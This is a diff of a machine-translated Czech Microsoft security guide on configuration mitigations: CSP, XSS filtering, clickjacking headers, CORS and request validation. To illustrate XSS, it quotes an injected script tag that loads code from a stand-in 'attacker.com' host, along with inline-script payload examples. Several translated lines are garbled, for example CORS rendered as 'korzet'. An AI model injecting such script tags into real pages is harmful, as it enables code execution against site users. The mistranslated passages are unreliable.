@@ -1,7 +1,7 @@
 ---
-title: Správa konfigurace pro Microsoft Threat Modeling Tool
+title: Správa konfigurace nástroje Microsoft Threat Modeling Tool
 titleSuffix: Azure
-description: zmírnění rizik pro ohrožené hrozby v Threat Modeling Tool
+description: zmírnění hrozeb vystavených v nástroji pro modelování hrozeb
 services: security
 documentationcenter: na
 author: jegeib
@@ -17,45 +17,45 @@ ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
 ms.openlocfilehash: 3c89fae09583c96cf8139885fe2554cf6784b4e3
-ms.sourcegitcommit: d45fd299815ee29ce65fd68fd5e0ecf774546a47
+ms.sourcegitcommit: 2ec4b3d0bad7dc0071400c2a2264399e4fe34897
 ms.translationtype: MT
 ms.contentlocale: cs-CZ
-ms.lasthandoff: 03/04/2020
+ms.lasthandoff: 03/28/2020
 ms.locfileid: "78269828"
 ---
-# <a name="security-frame-configuration-management--mitigations"></a>Rámec zabezpečení: Správa konfigurace | Hrozeb 
-| Produkt nebo službu | Článek |
+# <a name="security-frame-configuration-management--mitigations"></a>Rámec zabezpečení: Správa konfigurace | Skutečnosti snižující závažnost rizika 
+| Produkt/služba | Článek |
 | --------------- | ------- |
-| **Webová aplikace** | <ul><li>[Implementace zásad zabezpečení obsahu (CSP) a zakázání vloženého JavaScriptu](#csp-js)</li><li>[Povolit filtr skriptování XSS v prohlížeči](#xss-filter)</li><li>[Aplikace ASP.NET musí před nasazením zakázat trasování a ladění.](#trace-deploy)</li><li>[Přístup k javascriptům třetích stran jenom z důvěryhodných zdrojů](#js-trusted)</li><li>[Zajistěte, aby ověřené stránky ASP.NET zahrnovaly přeopravení uživatelského rozhraní nebo obrany při kliknutí na zdířky.](#ui-defenses)</li><li>[Zajistěte, aby byly povoleny pouze důvěryhodné zdroje, pokud je v ASP.NET webových aplikacích povoleno CORS.](#cors-aspnet)</li><li>[Povolit atribut ValidateRequest na stránkách ASP.NET](#validate-aspnet)</li><li>[Používat místně hostované nejnovější verze knihoven JavaScript](#local-js)</li><li>[Zakázat automatické sledování dat v kódování MIME](#mime-sniff)</li><li>[Odebrání standardních hlaviček serveru na webech Windows Azure, aby nedocházelo k otiskům prstů](#standard-finger)</li></ul> |
-| **Database** | <ul><li>[Konfigurace brány Windows Firewall pro přístup k databázovému stroji](#firewall-db)</li></ul> |
-| **Webové rozhraní API** | <ul><li>[Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v rozhraní Web API pro ASP.NET povolené CORS.](#cors-api)</li><li>[Šifrovat oddíly konfiguračních souborů webového rozhraní API, které obsahují citlivá data](#config-sensitive)</li></ul> |
-| **Zařízení IoT** | <ul><li>[Ujistěte se, že všechna rozhraní správce jsou zabezpečená pomocí silných přihlašovacích údajů.](#admin-strong)</li><li>[Zajistěte, aby na zařízeních nebyl spuštěn neznámý kód.](#unknown-exe)</li><li>[Zašifrujte operační systém a další oddíly zařízení IoT pomocí bitových zámků.](#partition-iot)</li><li>[Zajistěte, aby na zařízeních byly povolené jenom minimální služby a funkce.](#min-enable)</li></ul> |
-| **Brána pole IoT** | <ul><li>[Zašifrujte operační systém a další oddíly brány pole IoT pomocí bitových zámků.](#field-bit-locker)</li><li>[Ujistěte se, že výchozí přihlašovací údaje brány pole jsou během instalace změněny.](#default-change)</li></ul> |
-| **Cloudová brána IoT** | <ul><li>[Zajistěte, aby cloudová brána implementovala proces, který zachová firmware připojených zařízení v aktuálním stavu.](#cloud-firmware)</li></ul> |
-| **Hranice důvěryhodnosti počítače** | <ul><li>[Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncového bodu nakonfigurované podle zásad pro organizace.](#controls-policies)</li></ul> |
-| **Azure Storage** | <ul><li>[Zajistěte zabezpečenou správu přístupových klíčů Azure Storage.](#secure-keys)</li><li>[Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v Azure Storage povolené CORS.](#cors-storage)</li></ul> |
-| **WCF** | <ul><li>[Povolit funkci omezování služby WCF](#throttling)</li><li>[WCF – zpřístupnění informací prostřednictvím metadat](#info-metadata)</li></ul> | 
+| **Webová aplikace** | <ul><li>[Implementovat zásady zabezpečení obsahu (CSP) a zakázat vsazený javascript](#csp-js)</li><li>[Povolení filtru XSS prohlížeče](#xss-filter)</li><li>[ASP.NET aplikace musí před nasazením zakázat trasování a ladění.](#trace-deploy)</li><li>[Přístup k javaskriptům třetích stran pouze z důvěryhodných zdrojů](#js-trusted)</li><li>[Ujistěte se, že ověřené ASP.NET stránky obsahují obranu proti nápravě nebo přezvedání kliknutí.](#ui-defenses)</li><li>[Ujistěte se, že jsou povoleny pouze důvěryhodné počátky, pokud je v ASP.NET webových aplikacích povolen a je povolen](#cors-aspnet)</li><li>[Povolit atribut ValidateRequest na stránkách ASP.NET](#validate-aspnet)</li><li>[Použití místně hostovaných nejnovějších verzí knihoven JavaScript](#local-js)</li><li>[Zakázat automatické čichání MIME](#mime-sniff)</li><li>[Odebrání standardních záhlaví serverů na webech Windows Azure, abyste zabránili snímání otisků prstů](#standard-finger)</li></ul> |
+| **Databáze** | <ul><li>[Konfigurace brány Windows Firewall pro přístup k databázovému stroji](#firewall-db)</li></ul> |
+| **Web API** | <ul><li>[Ujistěte se, že jsou povoleny pouze důvěryhodné počátky, pokud je v ASP.NET webovém rozhraní API povolen a korzet](#cors-api)</li><li>[Šifrování částí konfiguračních souborů webového rozhraní API, které obsahují citlivá data](#config-sensitive)</li></ul> |
+| **Zařízení IoT** | <ul><li>[Ujistěte se, že všechna rozhraní pro správu jsou zabezpečena silnými přihlašovacími údaji](#admin-strong)</li><li>[Ujistěte se, že neznámý kód nelze spustit na zařízeních](#unknown-exe)</li><li>[Šifrování operačního systému a dalšíoddíly zařízení IoT pomocí bitové skříňky](#partition-iot)</li><li>[Ujistěte se, že jsou na zařízeních povoleny pouze minimální služby/funkce.](#min-enable)</li></ul> |
+| **Brána ioT pole** | <ul><li>[Šifrování operačního systému a dalšíoddíly brány IoT Field Gateway pomocí bitové skříňky](#field-bit-locker)</li><li>[Ujistěte se, že se během instalace změní výchozí přihlašovací údaje brány pole.](#default-change)</li></ul> |
+| **Cloudová brána IoT** | <ul><li>[Ujistěte se, že cloudová brána implementuje proces, který udržuje firmware připojených zařízení v aktuálním stavu.](#cloud-firmware)</li></ul> |
+| **Hranice důvěryhodnosti počítače** | <ul><li>[Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncového bodu nakonfigurované podle zásad organizace](#controls-policies)</li></ul> |
+| **Azure Storage** | <ul><li>[Zajištění zabezpečené správy přístupových klíčů úložiště Azure](#secure-keys)</li><li>[Ujistěte se, že jsou povoleny pouze důvěryhodné původy, pokud je cors povolena v úložišti Azure](#cors-storage)</li></ul> |
+| **WCF** | <ul><li>[Povolit funkci omezení služeb WCF](#throttling)</li><li>[WCF-Information disclosure prostřednictvím metadat](#info-metadata)</li></ul> | 
 
-## <a id="csp-js"></a>Implementace zásad zabezpečení obsahu (CSP) a zakázání vloženého JavaScriptu
+## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementovat zásady zabezpečení obsahu (CSP) a zakázat vsazený javascript
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Informace o zásadách zabezpečení obsahu](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referenčních informací o zásadách zabezpečení](https://content-security-policy.com/)obsahu, [funkcích zabezpečení](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Úvod k zásadám zabezpečení obsahu](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), můžu [použít CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Kroky** | <p>Zásady zabezpečení obsahu (CSP) jsou bezpečnostní mechanizmus, který je ve formátu W3C Standard, který umožňuje vlastníkům webových aplikací řídit obsah vložený na jejich webu. CSP se přidá jako hlavička HTTP odpovědi na webovém serveru a na straně klienta se vynutilo pomocí prohlížečů. Je to zásada založená na seznamu povolených – web může deklarovat sadu důvěryhodných domén, ze kterých se dá načíst aktivní obsah, jako je JavaScript.</p><p>CSP přináší následující výhody zabezpečení:</p><ul><li>**Ochrana proti XSS:** Pokud je stránka pro skriptování XSS zranitelná, útočník ji může zneužít dvěma způsoby:<ul><li>Vložit `<script>malicious code</script>`. Tato zneužití nebudou fungovat v důsledku základního omezení CSP – 1.</li><li>Vložit `<script src="http://attacker.com/maliciousCode.js"/>`. Toto zneužití nebude fungovat, protože doména řízená útočníkem nebude v seznamu povolených domén CSP.</li></ul></li><li>**Kontrola nad exfiltrace dat:** Pokud se nějaký škodlivý obsah na webové stránce pokusí připojit k externímu webu a ukrást data, připojení pomocí CSP bude přerušeno. Důvodem je to, že cílová doména nebude v seznamu povolených poskytovatelů CSP.</li><li>**Obrana proti kliknutí na zdířky:** kliknutí na zdířku je technika útoku, pomocí které nežádoucí osoba může orámovat originální web a přinutit uživatele, aby na prvky uživatelského rozhraní klikní. V současné době se ochrana proti kliknutí na konektory dosahuje konfigurací odpovědí-X-frame-Options. Ne všechny prohlížeče respektují tuto hlavičku a přenášející se poskytovatel CSP bude standardní způsob, jak se chránit před kliknutím na zásuvku</li><li>**Vytváření sestav útoku v reálném čase:** Pokud dojde k útoku na vložení na webu s povoleným CSP, prohlížeče automaticky aktivují oznámení na koncový bod nakonfigurovaný na webovém serveru. Tímto způsobem CSP slouží jako výstražný systém v reálném čase.</li></ul> |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Úvod k zásadám zabezpečení obsahu](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [odkaz na zásady zabezpečení obsahu](https://content-security-policy.com/), funkce [zabezpečení](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), úvod do zásad [zabezpečení obsahu](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), lze [použít csp?](https://caniuse.com/#feat=contentsecuritypolicy) |
+| **Kroky** | <p>Zásady zabezpečení obsahu (CSP) je mechanismus zabezpečení hloubkové ochrany, standard W3C, který umožňuje vlastníkům webových aplikací mít kontrolu nad obsahem vloženým na jejich webu. CSP je přidán jako hlavička odpovědi HTTP na webovém serveru a je vynucenna straně klienta prohlížeči. Jedná se o zásadu založenou na whitelistu - webová stránka může deklarovat sadu důvěryhodných domén, ze kterých lze načíst aktivní obsah, jako je JavaScript.</p><p>CSP poskytuje následující výhody zabezpečení:</p><ul><li>**Ochrana proti XSS:** Pokud je stránka ohrožena xss, útočník ji může zneužít 2 způsoby:<ul><li>Aplikujte `<script>malicious code</script>`. Toto zneužití nebude fungovat z důvodu Základní omezení CSP-1</li><li>Aplikujte `<script src="http://attacker.com/maliciousCode.js"/>`. Toto zneužití nebude fungovat, protože útočníci řízená doména nebude na seznamu povolených domén csp</li></ul></li><li>**Kontrola exfiltrace dat:** Pokud se škodlivý obsah na webové stránce pokusí připojit k externímu webu a ukrást data, bude připojení zprostředkovatelem zprostředkovatele zprostředkovatele zprostředkovatele zabezpečení přerušeno. Důvodem je, že cílová doména nebude v seznamu povolených csp</li><li>**Obrana proti click-jacking:** click-jacking je útočná technika, pomocí které může protivník zarámovat originální webové stránky a přinutit uživatele, aby klikli na prvky uživatelského rozhraní. V současné době je obrana proti click-jacking dosaženo konfigurací hlavičky odezvy- X-Frame-Options. Ne všechny prohlížeče respektují toto záhlaví a do budoucna CSP bude standardní způsob, jak se bránit proti click-jacking</li><li>**Hlášení o útoku v reálném čase:** Pokud dojde k injektážnímu útoku na webu s povolenou csp, prohlížeče automaticky spustí oznámení koncovému bodu nakonfigurovanému na webovém serveru. Tímto způsobem csp slouží jako systém varování v reálném čase.</li></ul> |
 
 ### <a name="example"></a>Příklad
-Příklad zásady: 
+Příklad zásad: 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-Tato zásada umožňuje skriptům načíst pouze ze serveru webové aplikace a serveru Google Analytics. Skripty načtené z jakékoli jiné lokality budou odmítnuty. Když je na webu povolený CSP, automaticky se zablokují následující funkce pro zmírnění útoků XSS. 
+Tato zásada umožňuje, aby se skripty načítalo pouze ze serveru webové aplikace a serveru Google Analytics. Skripty načtené z jiného webu budou odmítnuty. Pokud je na webu povolen a) je povolen a které mají následující funkce, jsou automaticky zakázány, aby se zmírnily útoky XSS. 
 
 ### <a name="example"></a>Příklad
-Vložené skripty se nespustí. Následují příklady vložených skriptů. 
+Vázací skripty se nespustí. Následují příklady válčných skriptů 
 ```javascript
 <script> some Javascript code </script>
 Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
@@ -68,52 +68,52 @@ javascript:alert(1);
 Example: var str="alert(1)"; eval(str);
 ```
 
-## <a id="xss-filter"></a>Povolit filtr skriptování XSS v prohlížeči
+## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Povolení filtru XSS prohlížeče
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
+| **Atributy**              | Není dostupné.  |
 | **Odkazy**              | [Filtr ochrany XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
-| **Kroky** | <p>Konfigurace záhlaví odpovědi X-XSS-Protection řídí filtr skriptu pro křížové stránky v prohlížeči. Tato hlavička odpovědi může obsahovat následující hodnoty:</p><ul><li>`0:` Tato akce zakáže filtr.</li><li>`1: Filter enabled` Pokud se zjistí útok na skriptování mezi weby, aby se útok zastavil, prohlížeč stránku upraví.</li><li>`1: mode=block : Filter enabled`. Místo upravování stránky, když se zjistí Útok XSS, prohlížeč znemožní vykreslování stránky.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Prohlížeč upraví stránku a nahlásí porušení.</li></ul><p>Toto je funkce Chromu, která pomocí sestav porušení CSP pošle podrobnosti identifikátoru URI dle vašeho výběru. Poslední 2 možnosti jsou považovány za bezpečné hodnoty.</p>|
+| **Kroky** | <p>Konfigurace hlavičky odezvy X-XSS-Protection řídí filtr skriptů mezi webovými stránkami prohlížeče. Tato hlavička odpovědi může mít následující hodnoty:</p><ul><li>`0:`Tím se zakáže filtr</li><li>`1: Filter enabled`Pokud je zjištěn skriptovací útok mezi weby, prohlížeč stránku dezinfikuje, aby útok zastavil.</li><li>`1: mode=block : Filter enabled`. Spíše než dezinfikovat stránku, když je detekován útok XSS, prohlížeč zabrání vykreslování stránky</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Prohlížeč stránku dezinfikuje a nahlásí porušení.</li></ul><p>Jedná se o funkci Chromium využívající zprávy o porušení csp k odeslání podrobností uri podle vašeho výběru. Poslední 2 možnosti jsou považovány za bezpečné hodnoty.</p>|
 
-## <a id="trace-deploy"></a>Aplikace ASP.NET musí před nasazením zakázat trasování a ladění.
+## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET aplikace musí před nasazením zakázat trasování a ladění.
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Přehled ladění ASP.NET](https://msdn.microsoft.com/library/ms227556.aspx), [Přehled trasování ASP.NET](https://msdn.microsoft.com/library/bb386420.aspx), [Postupy: povolení trasování pro aplikaci pro ASP.NET](https://msdn.microsoft.com/library/0x5wc973.aspx), [Postupy: povolení ladění pro aplikace ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
-| **Kroky** | Pokud je pro stránku povoleno trasování, každý prohlížeč, který ho požaduje, získá také informace o trasování obsahující data o interním stavu serveru a pracovním postupu. Tyto informace mohou být citlivé na zabezpečení. Když je ladění povoleno pro stránku, chyby, které se vyskytnou na serveru, budou mít za následek kompletní data trasování zásobníku uvedená v prohlížeči. Tato data můžou vystavovat informace citlivé na zabezpečení pro pracovní postup serveru. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [ASP.NET Přehled ladění](https://msdn.microsoft.com/library/ms227556.aspx), [přehled trasování ASP.NET](https://msdn.microsoft.com/library/bb386420.aspx), [Postup: Povolit trasování pro ASP.NET aplikaci](https://msdn.microsoft.com/library/0x5wc973.aspx), [Jak: Povolit ladění pro ASP.NET aplikace](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **Kroky** | Je-li pro stránku povoleno trasování, získá každý prohlížeč, který ji požaduje, také informace o trasování, které obsahují data o stavu interního serveru a pracovním postupu. Ta informace by mohla být citlivá na bezpečnost. Pokud je pro stránku povoleno ladění, chyby, ke nimž dochází na serveru, mají za následek úplná data trasování zásobníku prezentovaná prohlížeči. Tato data mohou vystavit citlivé informace o pracovním postupu serveru citlivé na zabezpečení. |
 
-## <a id="js-trusted"></a>Přístup k javascriptům třetích stran jenom z důvěryhodných zdrojů
+## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Přístup k javaskriptům třetích stran pouze z důvěryhodných zdrojů
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | JavaScripty třetích stran by měly být odkazovány pouze z důvěryhodných zdrojů. Koncové body odkazu by měly vždy být na SSL. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | JavaScripty třetích stran by měly být odkazovány pouze z důvěryhodných zdrojů. Referenční koncové body by měly být vždy na SSL. |
 
-## <a id="ui-defenses"></a>Zajistěte, aby ověřené stránky ASP.NET zahrnovaly přeopravení uživatelského rozhraní nebo obrany při kliknutí na zdířky.
+## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Ujistěte se, že ověřené ASP.NET stránky obsahují obranu proti nápravě nebo přezvedání kliknutí.
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [OWASP kliknutí na tahák pro ochranu pomocí konektorů](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [interní funkce IE – boj po kliknutí s X-frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
-| **Kroky** | <p>kliknutí na zdířky, označované také jako "útok na nápravu uživatelského rozhraní", je v případě, že útočník využije více průhledných nebo neprůhledných vrstev a získá uživateli možnost kliknout na tlačítko nebo odkaz na jinou stránku, pokud se na stránku na nejvyšší úrovni nechce kliknout.</p><p>Tato vrstva se dosahuje vytvořením škodlivé stránky s elementem IFRAME, který načte stránku oběti. Útočník proto má "zneužití", které je určeno pro svou stránku a jejich směrování na jinou stránku, která je pravděpodobně vlastněná jinou aplikací, doménou nebo obojím. Pokud chcete zabránit útokům na zdířky, nastavte správné hlavičky odpovědí protokolu HTTP na základě snímků, které prohlížeči přidávají pokyny, aby nepovolovaly rámce z jiných domén.</p>|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [OWASP click-jacking obrana Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - Boj proti click-jacking s X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
+| **Kroky** | <p>click-jacking, také známý jako "útok na nápravu uživatelského rozhraní", je, když útočník používá více průhledných nebo neprůhledných vrstev, aby oklamal uživatele, aby klikl na tlačítko nebo odkaz na jiné stránce, když měl v úmyslu kliknout na stránku nejvyšší úrovně.</p><p>Toto vrstvení je dosaženo vytvořením škodlivé stránky s iframe, který načte stránku oběti. Útočník tedy "zneucovává" kliknutí určená pro jejich stránku a jejich směrování na jinou stránku, pravděpodobně vlastněnou jinou aplikací, doménou nebo oběma. Chcete-li zabránit útokům na klepnutí, nastavte správné hlavičky odpovědí HTTP s x-frame-options, které prohlížeči dávají pokyn, aby nepovoloval rámování z jiných domén.</p>|
 
 ### <a name="example"></a>Příklad
-Záhlaví možností X-rámec lze nastavit prostřednictvím služby IIS Web. config. Fragment kódu Web. config pro lokality, které by nikdy neměly být orámovány: 
+Hlavičku X-FRAME-OPTIONS lze nastavit pomocí web.config služby IIS. Fragment kódu Web.config pro weby, které by nikdy neměly být zarámovány: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -125,7 +125,7 @@ Záhlaví možností X-rámec lze nastavit prostřednictvím služby IIS Web. co
 ```
 
 ### <a name="example"></a>Příklad
-Kód Web. config pro weby, které by měly být pouze orámovány stránkami ve stejné doméně: 
+Web.config kód pro weby, které by měly být orámovány pouze stránkami ve stejné doméně: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -136,19 +136,19 @@ Kód Web. config pro weby, které by měly být pouze orámovány stránkami ve 
     </system.webServer>
 ```
 
-## <a id="cors-aspnet"></a>Zajistěte, aby byly povoleny pouze důvěryhodné zdroje, pokud je v ASP.NET webových aplikacích povoleno CORS.
+## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Ujistěte se, že jsou povoleny pouze důvěryhodné počátky, pokud je v ASP.NET webových aplikacích povolen a je povolen
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Webové formuláře, MVC5 |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásady stejného původu a brání škodlivému webu v čtení citlivých dat z jiné lokality. V některých případech ale může být nutné vystavit rozhraní API bezpečně, které ostatní weby mohou spotřebovat. Sdílení prostředků mezi zdroji (CORS) je standard W3C, který umožňuje serveru zmírnit zásady stejného zdroje. Při použití CORS může server explicitně umožnit některé žádosti o více zdrojů a současně odmítat jiné.</p><p>CORS je bezpečnější a pružnější než u předchozích technik, jako je JSONP. V takovém případě umožňuje překlad CORS přidat k webové aplikaci několik hlaviček HTTP odpovědi (Access-Control-*) a můžete to udělat několika způsoby.</p>|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásady stejného původu a zabraňuje škodlivému webu ve čtení citlivých dat z jiného webu. Někdy však může být nutné bezpečně vystavit api, která jiné weby mohou využívat. Cross Origin Resource Sharing (CORS) je standard W3C, který umožňuje serveru uvolnit zásady stejného původu. Pomocí CORS server může explicitně povolit některé požadavky napříč původy při odmítnutí jiných.</p><p>CORS je bezpečnější a flexibilnější než předchozí techniky, jako je JSONP. Ve své podstatě, povolení CORS překládá k přidání několika hlavičky odpovědi HTTP (Access-Control-*) do webové aplikace, a to lze provést několika způsoby.</p>|
 
 ### <a name="example"></a>Příklad
-Pokud je k dispozici přístup k souboru Web. config, lze CORS přidat pomocí následujícího kódu: 
+Pokud je k dispozici přístup k web.config, pak CORS lze přidat pomocí následujícího kódu: 
 ```XML
 <system.webServer>
     <httpProtocol>
@@ -160,30 +160,30 @@ Pokud je k dispozici přístup k souboru Web. config, lze CORS přidat pomocí n
 ```
 
 ### <a name="example"></a>Příklad
-Pokud přístup k souboru Web. config není k dispozici, je možné konfigurovat CORS přidáním následujícího kódu CSharp: 
+Pokud přístup k web.config není k dispozici, pak CORS lze nakonfigurovat přidáním následujícího kódu CSharp: 
 ```csharp
 HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
-Upozorňujeme, že je důležité zajistit, aby byl seznam původních prvků v atributu Access-Control-Allow-Origin nastaven na konečnou a důvěryhodnou sadu zdrojů. Nepatřičná konfigurace (např. nastavení hodnoty *) umožní škodlivým webům aktivovat požadavky mezi zdroji na webovou aplikaci > bez jakýchkoli omezení, takže aplikace bude zranitelná proti útokům CSRF. 
+Vezměte prosím na vědomí, že je důležité zajistit, aby seznam počátků v atributu "Access-Control-Allow-Origin" byl nastaven na omezenou a důvěryhodnou sadu počátků. Pokud to nenakonfigurujete nevhodně (např. nastavení hodnoty jako '*') umožní škodlivým webům spouštět požadavky na příčný původ do webové aplikace >bez jakýchkoli omezení, čímž se aplikace stane zranitelnou vůči útokům CSRF. 
 
-## <a id="validate-aspnet"></a>Povolit atribut ValidateRequest na stránkách ASP.NET
+## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Povolit atribut ValidateRequest na stránkách ASP.NET
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Webové formuláře, MVC5 |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Žádost o ověření – zabránění útokům pomocí skriptů](https://www.asp.net/whitepapers/request-validation) |
-| **Kroky** | <p>Žádost o ověření, funkce ASP.NET od verze 1,1, brání serveru v přijetí obsahu obsahujícího nešifrovaný kód HTML. Tato funkce je navržená tak, aby zabránila útokům prostřednictvím injektáže skriptu, přičemž kód skriptu nebo HTML může být nevědomě odeslán na server, uložený a následně prezentovan jiným uživatelům. I když je to vhodné, důrazně doporučujeme ověřit všechna vstupní data a kódování HTML.</p><p>Ověření žádosti se provádí porovnáním všech vstupních dat se seznamem potenciálně nebezpečných hodnot. Pokud dojde ke shodě, ASP.NET vyvolá `HttpRequestValidationException`. Ve výchozím nastavení je funkce ověřování žádostí povolena.</p>|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Ověření požadavku – obrana před skriptovými útoky](https://www.asp.net/whitepapers/request-validation) |
+| **Kroky** | <p>Ověření požadavku, funkce ASP.NET od verze 1.1, brání serveru v přijímání obsahu obsahujícího nekódovaný kód HTML. Tato funkce je navržena tak, aby pomohla zabránit některým útokům vkládání skriptů, při kterých může být kód klientského skriptu nebo html nevědomky odeslán na server, uložen a poté předložen ostatním uživatelům. Stále důrazně doporučujeme ověřit všechna vstupní data a html je v případě potřeby zakódovat.</p><p>Ověření požadavku se provádí porovnáním všech vstupních dat se seznamem potenciálně nebezpečných hodnot. Pokud dojde ke shodě, `HttpRequestValidationException`ASP.NET vyvolá . Ve výchozím nastavení je funkce Ověření požadavku povolena.</p>|
 
 ### <a name="example"></a>Příklad
-Tuto funkci je však možné zakázat na úrovni stránky: 
+Tuto funkci však lze zakázat na úrovni stránky: 
 ```XML
 <%@ Page validateRequest="false" %> 
 ```
-nebo, na úrovni aplikace 
+nebo na aplikační úrovni 
 ```XML
 <configuration>
    <system.web>
@@ -191,32 +191,32 @@ nebo, na úrovni aplikace
    </system.web>
 </configuration>
 ```
-Upozorňujeme, že funkce ověření žádosti není podporovaná a není součástí MVC6 kanálu. 
+Upozorňujeme, že funkce ověření žádosti není podporována a není součástí kanálu MVC6. 
 
-## <a id="local-js"></a>Používat místně hostované nejnovější verze knihoven JavaScript
+## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Použití místně hostovaných nejnovějších verzí knihoven JavaScript
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | <p>Vývojáři, kteří používají standardní knihovny jazyka JavaScript, jako je JQuery, musí používat schválené verze běžných knihoven JavaScriptu, které neobsahují známé chyby zabezpečení. Dobrým postupem je použít nejnovější verzi knihoven, protože obsahují opravy zabezpečení pro známé chyby zabezpečení ve starších verzích.</p><p>Pokud poslední vydání nelze použít z důvodů kompatibility, je třeba použít níže uvedené minimální verze.</p><p>Přijatelné minimální verze:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1,9</li><li>JQuery Mobile 1.0.1</li><li>Cyklus JQuery 2,99</li><li>1\.9.0y JQuery DataTables</li></ul></li><li>**AJAX Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**Webové formuláře a AJAX pro ASP.NET**<ul><li>Webové formuláře ASP.NET a AJAX 4</li><li>ASP.NET AJAX 3,5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nikdy nečítat žádné knihovny JavaScriptu z externích webů, jako je například Public sítě CDN</p>|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
